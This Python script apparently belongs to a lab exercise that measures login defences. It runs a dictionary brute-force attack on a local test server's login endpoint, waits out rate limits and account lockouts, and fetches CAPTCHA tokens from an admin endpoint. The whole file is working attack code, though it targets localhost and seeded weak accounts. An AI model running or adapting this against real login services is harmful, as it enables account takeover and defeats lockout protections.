import time
import json
import os
import requests
from config import GROUP_SEED

BASE_URL = "http://127.0.0.1:5000"

DATA_DIR = "data"
USERS_FILE = "users.json"
USERS_PATH = os.path.join(DATA_DIR, USERS_FILE)

# Attack configuration
MAX_ATTEMPTS = 50000  # Default max attempts per configuration
MAX_DURATION_SECONDS = 7200  # 2 hours
TARGET_USERNAME = "weak_user_01"  # Default target


def load_password_dictionary(size="small"):
    """
    Load password dictionary for brute force attack.
    size: 'small', 'medium', 'large'
    """
    if size == "small":
        # Small dictionary for quick testing
        return [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "iloveyou", "trustno1", "1234567890",
            "sunshine", "master", "welcome", "shadow", "ashley",
            "football", "jesus", "michael", "ninja", "mustang",
            "password1", "000000", "admin", "letmein", "monkey",
            # Add known weak passwords from dataset
            "42400147", "70336321", "8325861", "114659", "69536627",
        ]
    elif size == "medium":
        # Medium size - include common + dataset passwords
        passwords = load_password_dictionary("small")
        # Add more common passwords
        passwords.extend([
            "access", "flower", "passw0rd", "starwars", "whatever",
            "qwertyuiop", "121212", "freedom", "666666", "trustno1",
        ])
        # Add medium strength passwords from our dataset
        passwords.extend([
            "yy93n52s", "pf48s5ypp", "8xz0wp27t", "3zq2fnnz8t",
            "vrerigml", "pqlui0dp4p", "dvjmido3", "i9lz9zmi",
        ])
        return passwords
    else:
        # Large - for comprehensive testing
        passwords = load_password_dictionary("medium")
        # You can expand this with rockyou.txt or similar
        # For now, just add GROUP_SEED
        passwords.append(str(GROUP_SEED))
        return passwords


def get_captcha_token(username):
    """
    Get CAPTCHA token from admin endpoint.
    """
    try:
        resp = requests.get(
            f"{BASE_URL}/admin/get_captcha_token",
            params={"group_seed": GROUP_SEED, "username": username}
        )
        if resp.status_code == 200:
            return resp.json().get("captcha_token")
    except Exception as e:
        print(f"[!] Failed to get CAPTCHA token: {e}")
    return None


def brute_force_attack(
    target_username=TARGET_USERNAME,
    dictionary_size="small",
    max_attempts=MAX_ATTEMPTS,
    max_duration=MAX_DURATION_SECONDS,
    use_totp=False
):
    """
    Perform brute force attack on a single account.
    
    Args:
        target_username: Username to attack
        dictionary_size: 'small', 'medium', 'large'
        max_attempts: Maximum number of attempts
        max_duration: Maximum attack duration in seconds
        use_totp: If True, attempt to use TOTP (requires totp_secret)
    """
    print("\n" + "="*60)
    print(f"BRUTE FORCE ATTACK")
    print("="*60)
    print(f"Target: {target_username}")
    print(f"Dictionary size: {dictionary_size}")
    print(f"Max attempts: {max_attempts}")
    print(f"Max duration: {max_duration}s")
    print(f"TOTP: {use_totp}")
    print("="*60 + "\n")

    passwords = load_password_dictionary(dictionary_size)
    
    total_attempts = 0
    success = False
    success_password = None
    rate_limited_count = 0
    locked_count = 0
    captcha_required_count = 0
    captcha_token = None

    start_time = time.perf_counter()

    for pw in passwords:
        if total_attempts >= max_attempts:
            print(f"\n[!] Reached max attempts limit: {max_attempts}")
            break

        elapsed = time.perf_counter() - start_time
        if elapsed >= max_duration:
            print(f"\n[!] Reached max duration: {max_duration}s")
            break

        total_attempts += 1

        # Prepare payload
        payload = {"username": target_username, "password": pw}
        
        # Add CAPTCHA token if we have one
        if captcha_token:
            payload["captcha_token"] = captcha_token

        # Choose endpoint
        endpoint = "/login_totp" if use_totp else "/login"
        
        # For TOTP, we need the code (in real attack, this would be brute-forced too)
        if use_totp:
            # For demonstration, we skip TOTP brute force
            # In real scenario, you'd try common TOTP codes or brute force 000000-999999
            print("[!] TOTP brute force not implemented in this demo")
            break

        try:
            resp = requests.post(f"{BASE_URL}{endpoint}", json=payload, timeout=10)

            if resp.status_code == 200:
                success = True
                success_password = pw
                print(f"\n[+] SUCCESS! Password found: {success_password}")
                break
            elif resp.status_code == 429:
                rate_limited_count += 1
                print(f"[~] Rate limited (attempt {total_attempts})", end="\r")
                time.sleep(1)  # Wait before retry
            elif resp.status_code == 403:
                response_data = resp.json()
                if response_data.get("captcha_required"):
                    captcha_required_count += 1
                    print(f"\n[~] CAPTCHA required (attempt {total_attempts})")
                    # Get CAPTCHA token
                    captcha_token = get_captcha_token(target_username)
                    if captcha_token:
                        print(f"[+] Got CAPTCHA token, continuing...")
                    else:
                        print(f"[!] Failed to get CAPTCHA token")
                        break
                elif "locked" in response_data.get("error", ""):
                    locked_count += 1
                    print(f"\n[!] Account locked (attempt {total_attempts})")
                    print(f"[~] Waiting for lockout to expire...")
                    time.sleep(60)  # Wait for lockout to expire
            else:
                # Failed attempt
                if total_attempts % 100 == 0:
                    print(f"[~] Attempt {total_attempts} - Testing: {pw[:20]}...", end="\r")

        except requests.exceptions.RequestException as e:
            print(f"\n[!] Request error: {e}")
            time.sleep(1)

    # Calculate statistics
    duration = time.perf_counter() - start_time
    attempts_per_sec = total_attempts / duration if duration > 0 else 0

    print("\n" + "="*60)
    print("BRUTE FORCE ATTACK SUMMARY")
    print("="*60)
    print(f"Target username:      {target_username}")
    print(f"Total attempts:       {total_attempts}")
    print(f"Total duration:       {duration:.2f} seconds")
    print(f"Attempts per second:  {attempts_per_sec:.2f}")
    print(f"Rate limited events:  {rate_limited_count}")
    print(f"Account locked events:{locked_count}")
    print(f"CAPTCHA challenges:   {captcha_required_count}")
    print(f"\nResult: {'SUCCESS' if success else 'FAILED'}")
    if success:
        print(f"Password found: {success_password}")
    print("="*60 + "\n")

    return {
        "success": success,
        "password": success_password,
        "attempts": total_attempts,
        "duration": duration,
        "rate_limited": rate_limited_count,
        "locked": locked_count,
        "captcha_challenges": captcha_required_count,
    }


if __name__ == "__main__":
    # Run attack with default settings
    result = brute_force_attack(
        target_username="weak_user_01",
        dictionary_size="medium",
        max_attempts=50000,
        max_duration=7200,
        use_totp=False
    )
    
    # Save results
    results_file = "logs/bruteforce_results.json"
    os.makedirs("logs", exist_ok=True)
    
    with open(results_file, "w") as f:
        json.dump(result, f, indent=2)
    
    print(f"Results saved to {results_file}")
